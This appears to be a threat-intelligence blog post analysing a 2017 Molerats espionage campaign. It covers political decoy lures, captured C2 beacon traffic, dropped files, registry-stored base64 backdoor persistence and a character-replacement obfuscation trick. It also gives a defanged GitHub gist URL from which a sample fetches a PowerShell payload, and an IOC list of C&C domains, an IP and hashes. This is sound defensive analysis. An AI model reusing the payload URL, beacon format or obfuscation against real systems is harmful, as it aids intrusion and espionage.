@@ -1,0 +1,487 @@
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+Operation Desert Eagle
+
+
+Malware PartyMalware Party
+
+Operation Desert EagleOperation Desert Eagle
+July 06, 2017
+
+Operation	Desert	Eagle	takes	a	look	into	the	recent	activity	of	the	Molerats	(Gaza	cybergang)	group.
+These	actors	are	believed	to	be	politically	motivated.	For	more	on	their	earlier	activity,	see
+
+(http://www.clearskysec.com/wp-content/uploads/2016/01/Operation%20DustySky_TLP_WHITE.pdf).	
+
+	---------------------------------------------------------------------------------------------------------------------------
+
+Decoy	Docs/Links	(Translated):
+
+"Who stands around the attempt to assassinate al – Jubeir"
+
+http://mymalwareparty.blogspot.tw/
+http://mymalwareparty.blogspot.tw/
+https://3.bp.blogspot.com/-1vDTvfTnP-w/WV6WwlEsnJI/AAAAAAAAABs/Re4VLD5FqAAYuTDdtXOcB8HNGaJKCwPwACLcBGAs/s1600/Operation_Desert_Eagle.jpg
+https://www.blogger.com/profile/10892753459126003746
+https://www.blogger.com/profile/00374670984241884329
+https://www.blogger.com/go/report-abuse
+
+
+ 
+
+"The quarrel between Trump and Abbas"
+ 
+
+"Exclusive video of an assassin of the leader of the Hamas movement Mazen Faqha."
+
+"A	leaked	document	that	outlines	Majid	Faraj's	plan	to	install	Dahlan	as	head	of	the	Gaza
+government!"	
+
+https://1.bp.blogspot.com/-XUtba9AVCGc/WV6YHbovWbI/AAAAAAAAAB0/wiFLnL1Pdk8FFrNAmpFY_QbSGlLdanPKQCLcBGAs/s1600/White_Paper_Decoy_Doc_Assanation.png
+https://2.bp.blogspot.com/--CbshS9w-hc/WV6YfWPXc4I/AAAAAAAAAB4/jvgQgFDisKwQ1hEd80Q-fhQIkdkLhkyPQCLcBGAs/s1600/Trump_Decoy.png
+https://3.bp.blogspot.com/-Wd5avUGGT_M/WV6ZAL0k-DI/AAAAAAAAAB8/7h1sBA4l7yUVlX2UH44IlcYwcwAF3h_sgCLcBGAs/s1600/3rd%2Bsample.png
+
+
+ 
+
+	---------------------------------------------------------------------------------------------------------------------------
+
+	
+
+Malware	(NeD	Worm?)
+
+The quarrel between Trump and Abbas (a856f56fec6abdc3a93c3715be1567e5)
+
+Network	Activity:
+
+DNS	request
+
+Server	Response
+
+https://1.bp.blogspot.com/-4TYrDFHqUe8/WV6ZIpWKNXI/AAAAAAAAACA/ju5sOxLd82g9OkaMa1ctb6vcfdVAwXynQCLcBGAs/s1600/PS%2BState%2Bof%2BPalestine%2Bsammple.png
+https://1.bp.blogspot.com/-d-evh0_1a4U/WV6a_fNkHPI/AAAAAAAAACQ/2NGwt-1Z1qofqDy5A7OMPkqkp1LRRHtAACLcBGAs/s1600/wikaba.png
+https://4.bp.blogspot.com/-uGMtcTs_ZzQ/WV6a2VywIVI/AAAAAAAAACM/dZinpctnrW8dZpV-5fQY6g5Jt8wvt3XyQCEwYBhgL/s1600/moo.png
+
+
+Beacon
+
+Connection	check	+	Host	identifier	and	campaign
+
+Additional	Beacon
+
+	
+
+	
+2nd	part	of	the	beacon
+
+https://4.bp.blogspot.com/-Lcpk8m4WgKM/WV6c75luaAI/AAAAAAAAACo/kJM2BVpJHZ0vJwOE7HdmQC1oBLzd_2nPgCLcBGAs/s1600/wikaba_Response.png
+https://3.bp.blogspot.com/-CaA69kWdQpI/WV6b0HJ3CTI/AAAAAAAAACc/lyr4Y2o_fJAzWIckVFuIwhEOc2BpHXp8wCLcBGAs/s1600/White_Paper_Pcap_Beacon.png
+https://2.bp.blogspot.com/-4pnyIpkFnDI/WV6cV70ajiI/AAAAAAAAACg/1ak7BulJ-eofIk24Pf-4Qtdbo1VD3PAVwCLcBGAs/s1600/GET_U.png
+
+
+POST	/CheckVersion.php	HTTP/1.1
+Content-Type:	application/x-www-form-urlencoded
+User-Agent:	32170141182235342154130912011691581873993Send-N
+Host:	xxx.xxx.xxx.xxx
+Content-Length:	447
+Expect:	100-continue
+
+9568=[host	identifier]Random,&1077569=[Base64	Data]
+
+User	agent	has	campaign	ID	(Send-N,	JOND,	Random,	or	FUD)	appended	to	the	end	of	the	victim’s
+unique	identifier	string.		
+
+Another	interesting	thing	to	note	is	that	the	backdoor	does	not	make	the	GET	requests	to	the	domain
+names	above	(wiknet[.]wikaba[.]com	or	wiknet[.]moo[.]com).	Rather	it	uses	the	IP	that	the	host	name
+
+points	to	(in	this	case,	my	fakenet	dns	ip).
+
+Let’s	take	a	look	on	how	this	network	traffic	compares	to	the	older	NeD	Worm	samples
+		
+
+Above	image	taken	from	(http://www.clearskysec.com/wp-content/uploads/2016/01/Operation%20DustySky_TLP_WHITE.pdf)	
+
+---------------------------------------------------------------------------------------------------------------------------	
+		
+
+Host	Activity:
+
+Dropped	Files:
+
+C:\Program	Files	(x86)\%AppDate%\29175\explorer.vbs
+
+C:\Program	Files	(x86)\%AppDate%\29175\News.url
+
+C:\Users\User\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\explorer.lnk
+
+https://2.bp.blogspot.com/-ZZQFYoPgkGc/WV6dwzAQxqI/AAAAAAAAACs/6SWsUQjFNi4oddovylOuwSHBkI9-9pLqQCLcBGAs/s1600/Dusty%2BSky%2BNed%2BWorm%2BExample.png
+http://www.clearskysec.com/wp-content/uploads/2016/01/Operation DustySky_TLP_WHITE.pdf)
+
+
+C:\Users\User\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\explorer.vbs
+
+C:\Users\User\AppData\Roaming\Microsoft\Windows\StartMenu\Programs\Startup\powershell.lnk
+
+C:\CheckVersion.php
+
+After	execution,	a	registry	key	(HKU\...\Software\Microsoft\KeyName:)	is	created	which	contains	the
+backdoor	in	base64.
+
+		
+A	VBScript	replaces	the	following	characters	(~&^^%)	each	with	a	“0”.	After	the	characters	are
+
+replaced,	the	file	is	then	base64	decoded	and	executed.
+
+		C:\CheckVersion.php	–	contains	the	POST	data	used	in	the	2 	portion	of	the	beacon
+
+---------------------------------------------------------------------------------------------------------------------------	
+
+Additional	Backdoor	Obfuscation/Delivery:
+
+Sample	(4cbebeda71dceb9914a21d06e22223af)
+
+Once	executed	the	sample	makes	a	request	for:
+
+hxxps://gist[.]githubusercontent[.]com/0lol0/e69206a709a80133aebf55153847a6b2/raw/906a89289a
+30dbef36b157600fac11f0f04e4684/System.ps1
+
+nd
+
+https://1.bp.blogspot.com/-6JcH5jDl51U/WV6et_OSYXI/AAAAAAAAACw/h-VsCdWKLUoWBrr64MdmPZdKqY4t8FYLACLcBGAs/s1600/White_Paper_Registry_B64.png
+https://1.bp.blogspot.com/-y5ZeJEueqqI/WV6fGWchQtI/AAAAAAAAAC0/dh59XjCtGik-tC6BLRoX5Z0YIIBtBvqtwCLcBGAs/s1600/VBS%2B1.png
+
+
+System.ps1
+	
+
+The	actors	use	the	same	obfuscation	technique	as	the	previous	sample,	this	time	replacing	the
+following	characters	“$#~dqw645”	with	“0”.
+
+	
+When	taking	a	look	at	the	github	account	for	user	“0lol0”	we	can	see	that	the	actors	have	reused	this
+
+account	for	another	sample	with	a	slightly	different	script.
+
+	
+The	file	1.ps1	(other	file	on	“0lol0’s”	account)	is	a	downloader	(most	likely	for	the	backdoor):
+
+https://1.bp.blogspot.com/-NYab3jQWu28/WV6gTnYO0pI/AAAAAAAAAC4/xcwaaAWhRVQ87iTdbY33Q5rTT30PwXxkACLcBGAs/s1600/System_Ps1.png
+https://3.bp.blogspot.com/-DJMOtsj_M6M/WV6hC5OinUI/AAAAAAAAAC8/zHl8SdHdGwIKAwcDGxUkcUDZBDIFWv6UQCLcBGAs/s1600/0lol0_github.png
+https://1.bp.blogspot.com/-X2B9SeviTzI/WV6hU0P8GtI/AAAAAAAAADA/tY-FMfTulgskgok9W1-KneWAizfIjuTfgCLcBGAs/s1600/1_ps1.png
+
+
+	---------------------------------------------------------------------------------------------------------------------------
+
+	
+
+Infrastructure	overlaps	with	Operation	Dusty	Sky:
+	
+
+	---------------------------------------------------------------------------------------------------------------------------
+
+Indicators	Of	Compromise:
+		
+
+IOC Type/Comments
+Wiknet[.]wikaba[.]com C&C
+Wiknet[.]moo[.]com C&C
+104.200.67[.]190 C&C
+a856f56fec6abdc3a93c3715be1
+567e5
+
+MD5	-	The	quarrel	between
+Trump	and	Abbas
+
+91d0770261df8a1b3eba61483fd
+b255c
+
+MD5	-	Who	stands	around	the
+attempt	to	assassinate	al	–	Jubeir
+
+b241ae467006667eca4c2619855
+f5377
+
+MD5	-	Exclusive	video	of	an
+assassin	of	the	leader	of	the
+Hamas	movement	Mazen	Faqha.
+
+https://1.bp.blogspot.com/-pYI351HKnPg/WV6hmItVZ2I/AAAAAAAAADE/NLczaviXC14peQH0roPTOXTBUB1DUDoEQCLcBGAs/s1600/Infrastrucutre_Overlap.png
+
+
+Word add-in persistence found in the wildWord add-in persistence found in the wild
+
+Enter your comment...
+
+Popular posts from this blogPopular posts from this blog
+
+January 06, 2018
+
+278440a46195ba8fa628460530e
+601ed
+
+MD5	-	Has	honey	years	ended
+between	Hamas	and	Al-Thani?
+
+4cbebeda71dceb9914a21d06e2
+2223af
+
+MD5	-	A	leaked	document	that
+outlines	Majid	Faraj's	plan	to
+install	Dahlan	as	head	of	the
+Gaza	government!
+
+ea406ea60a05afa14f7debc67a7
+5a472
+
+MD5	-	Backdoor
+
+1c64b27a58b016a966c654f1fdf4
+c155
+
+MD5	-	Backdoor
+
+c8ab6e29d76d43268a5028f17fe
+4f48e
+
+MD5	-	Backdoor
+
+2a7e0463c7814465f9a78355c47
+54d0a
+
+MD5	-	Backdoor
+
+d01ff6f0bfb1b515e8ba10a453c7
+4d53
+
+MD5	-	Backdoor
+
+9bda0be7b30155c26c9236cbac7
+31dbd
+
+MD5	-	starts\explorer.vbs
+
+		
+
+Word add-in persistence found in the wild@Blu3_team
+@Malwareparty
+20180106 …
+
+http://mymalwareparty.blogspot.tw/2018/01/word-add-in-persistence-found-in-wild.html
+http://mymalwareparty.blogspot.tw/2018/01/word-add-in-persistence-found-in-wild.html
+http://mymalwareparty.blogspot.tw/2018/01/word-add-in-persistence-found-in-wild.html
+http://mymalwareparty.blogspot.tw/2018/01/word-add-in-persistence-found-in-wild.html
+
+
+ Powered by Blogger
+
+Theme images by Michael Elkan
+
+READ MOREREAD MORE
+
+http://mymalwareparty.blogspot.tw/2018/01/word-add-in-persistence-found-in-wild.html
+https://www.blogger.com
+http://www.offset.com/photos/394244
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	Malware Party
+	Contributors
+	Operation Desert Eagle
+	Archive
+	Report Abuse
+	Comments
+	Popular posts from this blog
+	Word add-in persistence found in the wild
+
+
